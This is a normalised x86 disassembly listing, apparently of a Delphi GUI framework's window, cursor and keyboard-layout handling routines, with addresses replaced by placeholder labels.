call sub_479ce0
push eax
call j_sub_4406ae
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
jmp r-xdata
push 0xffffffff
push 0x0
mov eax esi
call sub_479ce0
push eax
call InvalidateRect
jmp r-xdata
mov [ esp ] 0xffffffff
mov [ esp + 0x4 ] 0xffffffff
mov [ esp + 0x8 ] 0xffffffff
mov [ esp + 0xc ] 0xffffffff
mov edx [ eax + 0xc ]
mov [ esp ] edx
mov edx [ eax + 0x14 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x10 ]
mov [ esp + 0x8 ] edx
mov eax [ eax + 0x18 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x54 ]
mov [ esi + 0x54 ] eax
jmp r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_49c8e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x374 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_473dd4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_473dd4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov al 0x1
jmp r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
test al al
je r-xdata
test [ ebx + 0x55 ] 0x80
je r-xdata
test [ ebx + 0x55 ] 0x80
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] eax
mov eax [ r-xdata ]
or eax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebp - 0xc ]
jl r-xdata
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_49c8e4
pop ecx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_475848
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x374 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
sub_49ca24
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
call sub_49c8e4
pop ecx
sub_49ca48
cmp [ eax + 0x29e ] 0x2
jne r-xdata
retn
cmp [ eax + 0x37c ] 0x0
je r-xdata
push 0x0
movzx edx [ eax + 0x2a1 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x226
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
sub_49cb20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x104 ]
xor edx edx
mov eax ebx
call sub_495634
mov dl 0x5
mov eax ebx
call sub_497bfc
mov dl 0x1
mov eax ebx
call sub_4785b0
mov dl 0x3
mov eax ebx
call sub_49801c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_49cb88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_49cce2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_47843c
dec eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4782a4
mov dl 0x5
mov eax [ ebp - 0xc ]
call sub_470108
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_470dc0
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4071e4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49cce9
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_496cd0
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
mov ecx ebx
mov eax [ ebp - 0xc ]
call sub_470dd0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_470e88
mov ebx 0x1
mov edx r-xdata
mov [ ebp - 0x14 ] edx
cmp [ eax + ebx * 2 - 0x2 ] 0x100
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ eax + ebx * 2 - 0x2 ]
mov edx [ ebp - 0x14 ]
movzx eax al
bt [ edx ] eax
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
test al al
je r-xdata
mov al 0x1
inc ebx
dec esi
jne r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40740c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_49ccef
add [ eax ] al
and al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x4a6d173d ]
std
dec [ ebx - 0x48e4173d ]
std
inc [ ebp - 0x74f88a40 ]
retn
sub_49cd30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_475884
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4962bc
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
push esp
mov edx ebp
mov eax ebx
call sub_475848
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40587c
inc ebp
dec edi
jne r-xdata
sub_49cd7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_47843c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_49cda8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_49a29c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_49cdd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_49a2c0
cmp [ ebx + 0x8b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
jne r-xdata
mov eax ebx
call sub_47843c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_479ce0
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_479ce0
push eax
call PostMessageW
cmp [ ebx + 0x29d ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_478450
or ecx 0xffffffff
mov dl 0x1
call sub_471638
pop esi
pop ebx
retn
sub_49ce64
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47922c
cmp [ esi + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax ebx
call sub_472314
mov edi [ esi + 0x4 ]
cmp ebx [ edi + 0x90 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_4706f0
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40587c
sub_49cebc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_49d00b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_470dc0
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4071e4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub eax 0xafff
jne r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d012
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebx + 0x4 ]
movzx edx [ eax + 0x59 ]
mov eax [ ebp - 0x8 ]
call sub_496cd0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx esi
call sub_470dd0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_470e88
mov ebx 0x1
mov edx sub_49d018
mov [ ebp - 0xc ] edx
cmp [ eax + ebx * 2 - 0x2 ] 0x100
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ eax + ebx * 2 - 0x2 ]
mov edx [ ebp - 0xc ]
movzx eax al
bt [ edx ] eax
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
test al al
je r-xdata
mov al 0x1
inc ebx
dec esi
jne r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40740c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_49d018
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x48c5172d ]
std
dec [ ebx - 0x2dccf7bd ]
call sub_470108
pop ebx
retn
sub_49d050
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_478f60
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47843c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_478450
movzx edx [ ebx + 0x59 ]
call sub_470d70
inc edi
dec esi
jne r-xdata
sub_49d0f8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_49d128
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_49d17c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_49d201
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp + 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add edx 0x1c
mov ecx 0x20
call sub_407290
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
lea ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_411254
test eax eax
je r-xdata
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d208
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_49d214
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c14c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_49d670
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_49d67c
mov eax ebx
call sub_49d688
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x40 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x5c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x78 ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x44 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x5c ]
push eax
mov eax sub_497f08
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov [ ebx + 0x80 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov [ ebx + 0x7c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov [ ebx + 0x8c ] eax
mov eax ebx
call sub_49dbe8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_49da58
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_49da58
mov eax [ ebx + 0x7c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_49da58
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_49da58
mov eax [ ebx + 0x8c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_49da58
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_49d3a8
push ebx
push esi
push edi
push ebp
call sub_405bb4
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x88 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x7c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x84 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x80 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x8c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x58 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x54 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x50 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x34 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x38 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ ebp + 0x78 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ ebp + 0x5c ]
test eax eax
je r-xdata
lea eax [ ebp + 0x5c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax ebp
call sub_49d6e8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_43c198
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405b5c
inc esi
xor edi edi
mov eax [ ebp + 0x5c ]
mov edx edi
call sub_4305a0
call sub_4055f0
inc edi
dec esi
jne r-xdata
sub_49d594
push ebx
mov ebx eax
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov eax [ ebx + 0x60 ]
cmp eax [ ebx + 0x6c ]
je r-xdata
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x6c ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_49d5e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4303e0
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4303e0
mov eax [ rw-data ]
call sub_4a15e0
sub_49d618
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi esi
mov edx edi
xor ecx ecx
mov eax [ ebx + 0x54 ]
call sub_4307b0
mov edx edi
xor ecx ecx
mov eax [ ebx + 0x50 ]
call sub_4307b0
mov eax [ rw-data ]
call sub_4a15e0
mov eax [ ebx + 0x54 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_47be44
sub_49d688
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorW
mov [ ebp + 0xac ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorW
mov ecx eax
mov edx ebx
mov eax ebp
call sub_49d7cc
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_49d6e8
push ebx
push esi
push edi
push ebp
mov ebp eax
mov ebx [ ebp + 0xa8 ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorW
mov edx [ ebp + 0xac ]
cmp eax edx
je r-xdata
mov esi [ ebx + 0x4 ]
cmp esi 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp esi 0xffffffeb
je r-xdata
cmp esi 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jle r-xdata
mov edi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_404220
mov ebx edi
test ebx ebx
jne r-xdata
sub_49d74c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_49d540
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_49d52c
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_49d52c
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jne r-xdata
sub_49d7a0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push ebp
call sub_49d74c
pop ecx
test eax eax
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_49e7e8
push ebp
call sub_49d74c
pop ecx
sub_49d7cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_404204
mov edx [ ebx + 0xa8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0xa8 ] eax
pop edi
pop esi
pop ebx
retn
sub_49d7f8
push ebp
mov ebp esp
add esp 0xfffffc60
push ebx
xor edx edx
mov [ ebp - 0x3a0 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49d9a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d9ac
lea eax [ ebp - 0x3a0 ]
call j_sub_4068a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x3c
xor edx edx
call sub_4070a8
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ eax + 0x29 ] 0x0
mov dl 0x1
call sub_433b00
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x39c ] eax
mov [ ebp - 0x398 ] 0x0
lea ecx [ ebp - 0x39c ]
mov edx r-xdata
lea eax [ ebp - 0x394 ]
call sub_41296c
push eax
push 0x80000002
call RegOpenKeyExW
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_47fe8c
test al al
je r-xdata
xor eax eax
push ebp
push sub_49d961
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x200
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExW
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x3a0 ]
lea edx [ ebp - 0x314 ]
mov ecx 0x100
call sub_407290
mov edx [ ebp - 0x3a0 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x3c
lea edx [ ebp - 0x314 ]
mov ecx 0x100
call sub_407290
sub_49da58
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
xor ecx ecx
mov dx 0xb035
mov eax [ rw-data ]
call sub_4a13f4
cmp esi [ ebx + 0x7c ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4a10dc
mov dl 0x1
mov eax [ rw-data ]
call sub_4a10dc
sub_49dac4
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0xa8 ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0xac ]
jmp r-xdata
mov ecx [ ecx ]
sub_49daf0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp si [ ebx + 0x48 ]
je r-xdata
inc [ ebx + 0x4c ]
mov [ ebx + 0x48 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_49dac4
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x8 ]
